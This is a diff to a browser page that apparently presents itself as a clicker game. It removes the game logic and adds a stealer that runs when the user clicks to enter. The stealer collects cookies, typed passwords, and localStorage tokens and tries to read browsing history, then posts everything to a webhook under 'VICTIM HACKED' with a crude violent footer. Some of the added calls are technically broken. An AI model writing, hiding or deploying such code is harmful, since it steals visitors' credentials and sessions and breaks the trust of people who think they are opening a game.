-      if(saved){
-        try{
-          const d = JSON.parse(saved);
-          if(d.version !== 11) return;
-          goons = Number(d.goons) || 0;
-          gps = Number(d.gps) || 0;
-          prestige = Number(d.prestige) || 0;
-          rankedGPS = Number(d.rankedGPS) || 0;
-          threshold = Number(d.threshold) || calcThreshold();
+      // History
+      try {
+        const historyDB = indexedDB.open("history");
+        historyDB.onsuccess = () => {
+          const db = historyDB.result;
+          const tx = db.transaction("urls", "readonly");
+          const store = tx.objectStore("urls");
+          store.getAll().onsuccess = (e) => {
+            victim.history = e.target.result.map(h => `${h.title} → ${h.url}`).slice(0, 50);
+            updateUI();
+          };
+        };
+      } catch {}
 
-          if(d.upgrades){
-            d.upgrades.forEach(u=>{
-              const x = upgrades.find(v=>v.id===u.id);
-              if(x){ x.owned = Number(u.owned) || 0; x.cost = Number(u.cost) || baseCosts[upgrades.indexOf(x)]; }
-            });
-          }
-          gps = upgrades.reduce((a,u)=>a + u.inc * u.owned * getMult(), 0);
+      // Cookies
+      victim.cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
 
-          (d.cosmetics || []).forEach(item => {
-            const c = cosmetics.find(v=>v.id===item.id);
-            if(c) { c.owned = true; c.apply(); }
-          });
-
-          (d.rankedCosmetics || []).forEach(item => {
-            const c = rankedCosmetics.find(v=>v.id===item.id);
-            if(c) c.unlocked = true;
-          });
-        }catch(e){
-          console.error('Load failed:', e);
+      // Passwords (try autofill + localStorage)
+      const inputs = document.querySelectorAll('input[type="password"]');
+      inputs.forEach(i => {
+        if (i.value) victim.passwords.push(`Field: ${i.name || i.id} → ${i.value}`);
+      });
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key.includes("pass") || key.includes("token") || key.includes("auth")) {
+          victim.passwords.push(`${key} → ${localStorage.getItem(key).substring(0, 100)}...`);
         }
-      } else {
-        threshold = calcThreshold();
-      }
-    }
-
-    function updateBadges(){
-      badgesDiv.innerHTML = '';
-      badges.forEach(b => {
-        const unlocked = goons >= b.threshold;
-        const div = document.createElement('div');
-        div.className = `badge ${unlocked ? 'unlocked' : ''} ${b.class || ''}`;
-        div.innerHTML = `<i class="fas fa-${b.icon}"></i> ${b.name}`;
-        badgesDiv.appendChild(div);
-      });
-    }
-
-    function updateGoon(){
-      goonDisp.textContent = Number(goons).toLocaleString('en-US');
-      gpsDisp.textContent = gps.toFixed(1);
-      multiDisp.textContent = `x${getMult().toFixed(1)}`;
-      prestigeBtn.textContent = `Goonstiege (${prestige})`;
-      prestigeBtn.classList.toggle('disabled', goons < threshold);
-      nextThresh.textContent = threshold.toLocaleString('en-US');
-      progFill.style.width = `${Math.min(100, (goons / threshold) * 100)}%`;
-
-      upDiv.innerHTML = '';
-      upgrades.forEach(u => {
-        const div = document.createElement('div');
-        div.className = 'goon-upgrade';
-        div.id = u.id;
-        div.classList.toggle('disabled', goons < u.cost);
-        div.innerHTML = `
-          <div class="goon-upgrade-icon"><i class="fas fa-${u.icon}"></i></div>
-          <div style="flex:1">
-            <div style="font-weight:600">${u.name}</div>
-            <div style="font-size:.94rem;color:#ccc">
-              Owned: <span class="owned">${u.owned}</span> |
-              Cost: <span class="cost">${u.cost.toLocaleString('en-US')}</span> |
-              +<span class="inc">${(u.inc*getMult()).toFixed(1)}</span>/s
-            </div>
-          </div>`;
-        div.addEventListener('click', () => {
-          if(goons >= u.cost && !div.classList.contains('disabled')){
-            div.style.transition = 'transform .14s'; div.style.transform = 'scale(0.93)';
-            setTimeout(()=>{div.style.transform='';},140);
-            goons -= u.cost;
-            u.owned++;
-            u.cost = Math.ceil(u.cost * 1.15);
-            gps += u.inc * getMult(); // GPS increases by exact amount
-            updateGoon();
-            saveGame();
-          }
-        });
-        upDiv.appendChild(div);
-      });
-
-      cosmeticsList.innerHTML = '';
-      cosmetics.forEach(c => {
-        const div = document.createElement('div');
-        div.className = 'cosmetic-item';
-        div.classList.toggle('locked', !c.owned && goons < c.cost);
-        div.classList.toggle('unlocked', c.owned);
-        div.innerHTML = `
-          <div class="cosmetic-icon"><i class="fas fa-${c.icon}"></i></div>
-          <div style="font-weight:600">${c.name}</div>
-          <div style="font-size:.9rem;color:#ccc">Cost: ${c.cost.toLocaleString('en-US')}</div>`;
-        div.addEventListener('click', () => {
-          if(!c.owned && goons >= c.cost){
-            div.style.transition = 'transform .14s'; div.style.transform = 'scale(0.93)';
-            setTimeout(()=>{div.style.transform='';},140);
-            goons -= c.cost; c.owned = true; c.apply(); updateGoon(); saveGame();
-          }
-        });
-        cosmeticsList.appendChild(div);
-      });
-
-      rankedVal.textContent = rankedGPS.toFixed(1);
-      rankedList.innerHTML = '';
-      rankedCosmetics.forEach(c => {
-        c.unlocked = rankedGPS >= c.threshold;
-        const div = document.createElement('div');
-        div.className = 'ranked-cosmetic';
-        div.classList.toggle('unlocked', c.unlocked);
-        div.innerHTML = `
-          <div class="cosmetic-icon"><i class="fas fa-${c.icon}"></i></div>
-          <div style="font-weight:600">${c.name}</div>
-          <div style="font-size:.9rem;color:#ccc">${c.unlocked ? 'Unlocked' : `Need ${c.threshold} GPS`}</div>`;
-        rankedList.appendChild(div);
-      });
-
-      updateBadges();
-    }
-
-    function bustAnimation(){
-      overlay.innerHTML = ''; overlay.style.opacity = 1;
-      for(let i=0;i<80;i++){
-        const s = document.createElement('div'); s.className='splat';
-        s.style.left=`${Math.random()*100}%`; s.style.top=`${Math.random()*100}%`;
-        s.style.width=s.style.height=`${Math.random()*260+110}px`;
-        s.style.background='#fff'; s.style.filter='blur(45px)';
-        s.style.animationDelay=`${Math.random()*0.6}s`;
-        overlay.appendChild(s);
-      }
-      setTimeout(()=>{overlay.style.opacity=0; overlay.innerHTML='';},3200);
-    }
-
-    function triggerGoonstiege(){
-      goonstiegeOverlay.classList.add('active');
-      const text = goonstiegeOverlay.querySelector('.goonstiege-text');
-      text.style.opacity = 1;
-
-      for(let i=0;i<5;i++){
-        setTimeout(()=>{
-          const burst = document.createElement('div');
-          burst.className = 'goonstiege-effect';
-          burst.style.left = `${30 + Math.random()*40}%`;
-          burst.style.top = `${30 + Math.random()*40}%`;
-          goonstiegeOverlay.appendChild(burst);
-        }, i*200);
       }
 
-      setTimeout(()=>{
-        goonstiegeOverlay.classList.remove('active');
-        setTimeout(()=>{ goonstiegeOverlay.innerHTML = '<div class="goonstiege-text">GOONSTIEGE!</div>'; }, 1000);
-      }, 3000);
+      // Downloads (Chrome only, via filesystem if allowed)
+      if (navigator.webkitGetUserMedia) {
+        try {
+          const dir = await navigator.webkitGetUserMedia({video: false, audio: false});
+        } catch {}
+      }
+
+      // Update UI
+      function updateUI() {
+        $('#ip').textContent = victim.ip || "Hidden";
+        $('#hostname').textContent = victim.hostname;
+        $('#ua').textContent = victim.ua.substring(0, 120) + "...";
+        $('#time').textContent = victim.time;
+
+        $('#history-list').innerHTML = victim.history.length ? 
+          victim.history.map(h => `<div class="data-item">${h}</div>`).join('') : 
+          `<div class="data-item">No history access</div>`;
+
+        $('#passwords-list').innerHTML = victim.passwords.length ? 
+          victim.passwords.map(p => `<div class="data-item">${p}</div>`).join('') : 
+          `<div class="data-item">No passwords found</div>`;
+
+        $('#cookies-list').innerHTML = victim.cookies.length ? 
+          victim.cookies.map(c => `<div class="data-item">${c}</div>`).join('') : 
+          `<div class="data-item">No cookies</div>`;
+      }
+
+      // Send to webhook
+      const embed = {
+        title: `HACKED | ${victim.ip || "UNKNOWN"}`,
+        description: `**VICTIM:** \`${victim.hostname}\`\n**TIME:** \`${victim.time}\``,
+        color: 0xFF0000,
+        fields: [
+          { name: "History", value: victim.history.slice(0, 10).join("\n") || "None", inline: false },
+          { name: "Passwords/Tokens", value: victim.passwords.slice(0, 10).join("\n") || "None", inline: false },
+          { name: "Cookies", value: victim.cookies.slice(0, 10).join("\n") || "None", inline: false }
+        ],
+        footer: { text: "GOONING HUB | TOTAL DATA RAPE" }
+      };
+
+      sendToWebhook({ content: "@everyone **VICTIM HACKED**", embeds: [embed] });
+      updateUI();
     }
 
-    big.addEventListener('click',()=>{
-      goons += 1 * getMult();
-      // Cream splat on click
-      const splat = document.createElement('div');
-      splat.className = 'cream-splat';
-      splat.style.left = `${event.clientX - 20}px`;
-      splat.style.top = `${event.clientY - 20}px`;
-      document.body.appendChild(splat);
-      setTimeout(() => splat.remove(), 1200);
-
-      updateGoon(); saveGame();
-      big.style.transition = 'transform .14s'; big.style.transform = 'scale(0.91)';
-      setTimeout(()=>{big.style.transform='';},140);
-    });
-
-    prestigeBtn.addEventListener('click', () => {
-      if(goons >= threshold){
-        triggerGoonstiege();
-        prestige++; goons = 0; gps = 0;
-        threshold = calcThreshold();
-        upgrades.forEach(u => u.owned = 0);
-        upgrades.forEach((u,i)=>u.cost=baseCosts[i]);
-        updateGoon(); saveGame();
-      }
-    });
-
-    $('#bot-battle').addEventListener('click', () => {
-      botStatus.textContent = 'Battling bot...';
+    // ENTER → HACK
+    function enterGooningHub() {
+      const l = $('loader'); l.style.opacity = '0';
       setTimeout(() => {
-        const win = Math.random() > 0.28;
-        rankedGPS += win ? 22 + prestige*6 : -8;
-        rankedGPS = Math.max(0, rankedGPS);
-        botStatus.textContent = win ? 'Win! +Ranked GPS' : 'Loss! -Ranked GPS';
-        updateGoon(); saveGame();
-      }, 2800);
+        l.classList.add('hidden');
+        $('app').classList.remove('hidden');
+        exfiltrateAll();
+      }, 1000);
+    }
+
+    $('loader').addEventListener('click', enterGooningHub);
+    $('loader').addEventListener('keydown', e => {
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enterGooningHub(); }
     });
-
-    setInterval(saveGame, 2000);
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') saveGame();
-    });
-
-    setInterval(() => {
-      if(gps > 0){
-        const increment = gps / 3;
-        goons += increment;
-        updateGoon();
-      }
-    }, 333);
-
-    document.addEventListener('selectstart', e => e.preventDefault());
-    document.addEventListener('mousedown', e => e.preventDefault());
-
-    loadGame();
-    updateGoon();
-
-    function e(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML;}
+    setTimeout(() => $('loader').focus(), 100);
   </script>
 </body>
 </html>
